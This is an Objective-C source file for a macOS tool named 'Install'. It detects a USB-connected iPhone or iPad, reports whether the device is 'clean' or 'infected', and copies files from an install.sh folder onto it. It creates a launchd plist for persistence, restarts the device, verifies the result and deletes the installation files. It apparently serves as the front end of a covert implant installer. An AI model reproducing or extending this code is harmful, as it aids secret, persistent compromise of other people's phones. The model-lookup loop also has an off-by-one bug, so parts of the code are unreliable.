//
//  AppDelegate.m
//  Install
//
//  Created by armored on 2/7/13.
//  Copyright (c) 2013 armored. All rights reserved.
//

#import "AppDelegate.h"
#import "iOSUsbSupport.h"


static BOOL gIsDeviceAttached = FALSE;
static NSString *gIosInstallationPath = nil;

@implementation AppDelegate

- (void)dealloc
{
    [super dealloc];
}

#pragma mark -
#pragma mark Dialog message function
#pragma mark -

- (void)tPrint:(NSString*)theMsg
{
  [mMessage setStringValue: theMsg];
}

- (void)setIcon:(NSString*)theIcon
{
  NSString *imagePath = [NSString stringWithFormat:@"%@",
                         [[NSBundle mainBundle] pathForResource:theIcon
                                                         ofType:@"png"]];
  
  NSImage *activeIcon = [[NSImage alloc] initWithContentsOfFile: imagePath];
  
  [mIcon setImage:activeIcon];
}

#pragma mark -
#pragma mark Info device
#pragma mark -

char *models[] = {"iPhone1,1",
                  "iPhone1,2",
                  "iPhone2,1",
                  "iPhone3,1",
                  "iPhone3,2",
                  "iPhone3,3",
                  "iPhone4,1",
                  "iPhone5,1",
                  "iPhone5,2",
                  "iPad1,1",
                  "iPad2,1",
                  "iPad2,2",
                  "iPad2,3",
                  "iPad2,4",
                  "iPad3,1",
                  "iPad3,2",
                  "iPad3,3",
                  "iPad3,4",
                  "iPad3,5",
                  "iPad3,6",
                  NULL};

NSString *models_name[] =  {@"iPhone",
                            @"iPhone 3G",
                            @"iPhone 3GS",
                            @"iPhone 4",
                            @"iPhone 4",
                            @"iPhone 4(cdma)",
                            @"iPhone 4s",
                            @"iPhone 5(gsm)",
                            @"iPhone 5",
                            @"iPad",
                            @"iPad2(wi-fi)",
                            @"iPad2(gsm)",
                            @"iPad2(cdma)",
                            @"iPad2(wi-fi)",
                            @"iPad3(wi-fi)",
                            @"iPad3(gsm)",
                            @"iPad3",
                            @"iPad4(wi-fi)",
                            @"iPad4(gsm)",
                            @"iPad4",
                            NULL};
- (void)setModel
{
  char gModel[256];
  char gVersion[256];
  int i = 0;
  
  NSString *theModel = @"Unknown device";
  
  sprintf(gModel, "%s", get_model());
  sprintf(gVersion, "%s", get_version());
  
  if (gModel == NULL)
    return;
  
  while (models[i++] != NULL)
  {
    if (strcmp(models[i], gModel) == 0)
    {
      theModel = models_name[i];
      break;
    }
  }
  
  NSString *msg = [NSString stringWithFormat:@"Model: %@\nVersion: %s",
                                             theModel,
                                             gVersion];
  
  [mModel setStringValue: msg];
}

#pragma mark -
#pragma mark Check device thread
#pragma mark -

- (void)waitForDevice:(id)anObject
{  
  BOOL isAttached = (BOOL)isDeviceAttached();
  
  if (isAttached == TRUE)
  {        
    [self setIcon:@"iphone"];
    
    [self setModel];
    
    [self tPrint:@"check device..."];
    
    if (check_installation(1, 2) == 0)
    {
      [self tPrint:@"check device... device is clean"];
      
      if (gIosInstallationPath != nil)
        [mInstall setEnabled:YES];
      
      gIsDeviceAttached = TRUE;
    }
    else
    {
      [self tPrint:@"check device... device infected!"];
      gIsDeviceAttached = FALSE;
    }
  }
  else
  {
    [self tPrint:@"cannot connect to device"];
  }
}

#pragma mark -
#pragma mark Entry notification
#pragma mark -

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
  [self tPrint: @"Waiting for device..."];
  
  sleep(1);
  
  gIosInstallationPath = [self getIosPath];
  
  if (gIosInstallationPath == nil)
  {
    [self alertForCoreDirectory:@"iOS installation directory not found"
                   andAlternate:nil];
  }
  
  [NSThread detachNewThreadSelector:@selector(waitForDevice:)
                           toTarget:self
                         withObject:nil];
}

#pragma mark -
#pragma mark iOS installation folder routine
#pragma mark -

- (NSInteger)alertForCoreDirectory:(NSString*)messageText
                      andAlternate:(NSString*)alternate
{
  NSAlert *alert = [NSAlert alertWithMessageText:messageText
                                   defaultButton:@"Ok"
                                 alternateButton:alternate
                                     otherButton:nil
                       informativeTextWithFormat:@" "];
                    
  return [alert runModal];
}

- (NSString*)askForCoreDirectory
{
  NSString *installPath = nil;

  NSOpenPanel* openDlg = [NSOpenPanel openPanel];

  [openDlg setCanChooseFiles:NO];

  [openDlg setCanChooseDirectories:YES];

  if ( [openDlg runModal] == NSOKButton )
  {
    NSArray* files = [openDlg URLs];

    NSURL *_installUrl = [files objectAtIndex:0];
    
    installPath = [[[_installUrl path] retain] autorelease];
  }
  
  return installPath;
}

- (NSString*)getIosPath
{
  NSString *iosPath = [NSString stringWithFormat:@"%@/../ios",
                                                [[NSBundle mainBundle] bundlePath]];
  
  NSString *installPath =[NSString stringWithFormat:@"%@/../ios/install.sh",
                                                    [[NSBundle mainBundle] bundlePath]];
  
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == TRUE)
    return [iosPath retain];
  
  if ([self alertForCoreDirectory:@"iOS installation directory not found: please select one"
                     andAlternate:@"Cancel"] == NSAlertAlternateReturn)
    return nil;
  
  iosPath = [self askForCoreDirectory];
  
  if (iosPath == nil)
    return nil;
  
  installPath =[NSString stringWithFormat:@"%@/install.sh", iosPath];
    
  if ([[NSFileManager defaultManager] fileExistsAtPath:installPath] == FALSE)
    return nil;
  
  return [iosPath retain];
}

#pragma mark -
#pragma mark Installation routine
#pragma mark -

- (void)startInstallation:(id)anObject
{
  int isDeviceOn = 0;
  
  [self tPrint: @"start installation..."];
  
  NSString *path = gIosInstallationPath;
  
  if (path == nil)
  {
    [self tPrint: @"cannot found installation dir!"];
    return;
  }
  
  char *lpath = (char*)[path cStringUsingEncoding:NSUTF8StringEncoding];
  
  char **dir_content = list_dir_content(lpath);
  
  if (dir_content == NULL)
  {
    [self tPrint: @"cannot found installation dir!"];
    return;
  }
  
  if (make_install_directory() != 0)
  {
    [self tPrint: @"cannot create installer folder"];
    return;
  }
  
  [self tPrint: @"copying files..."];
  
  if (copy_install_files(lpath, dir_content) != 0)
  {
    [self tPrint: @"cannot copy files in installer folder"];
    return;
  }
    
  [self tPrint: @"copying files... done!"];
  
  if (create_launchd_plist() != 0)
  {
    [self tPrint: @"cannot create plist files"];
    return;
  }
  
  [self tPrint: @"try to restart device..."];
  
  int retVal = restart_device();
  
  if (retVal == 1)
    [self tPrint: @"try to restart device...restarting"];
  else
    [self tPrint: @"can't restart device: try it manually!"];
  
  [mInstall setEnabled:NO];
  
  sleep(1);
  
  // Wait for device off
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 1);
  
  [self setIcon:@"iphone grayed"];
  
  // wait device on
  do
  {
    isDeviceOn = isDeviceAttached();
    
    sleep(1);
  
  } while(isDeviceOn == 0);
  
  [self tPrint: @"device connected"];
  
  [self setIcon:@"iphone"];
  
  [self setModel];
  
  [self tPrint: @"checking installation..."];
  
  if (check_installation(10, 10) == 1)
  {
    [self tPrint: @"installation done!"];
    
    if (remove_installation() == 0)
      [self tPrint: @"cannot remove installation file!"];
  }
  else
  {
    [self tPrint: @"installation failed: please retry!"];
  }
  
}

#pragma mark -
#pragma mark Button actions
#pragma mark -

- (IBAction)install:(id)sender
{
  if (gIsDeviceAttached == FALSE)
    return;
  
  [NSThread detachNewThreadSelector:@selector(startInstallation:)
                           toTarget:self
                         withObject:nil];
  
  [mInstall setEnabled: FALSE];
}

- (IBAction)cancel:(id)sender
{
  exit(0);
}

@end
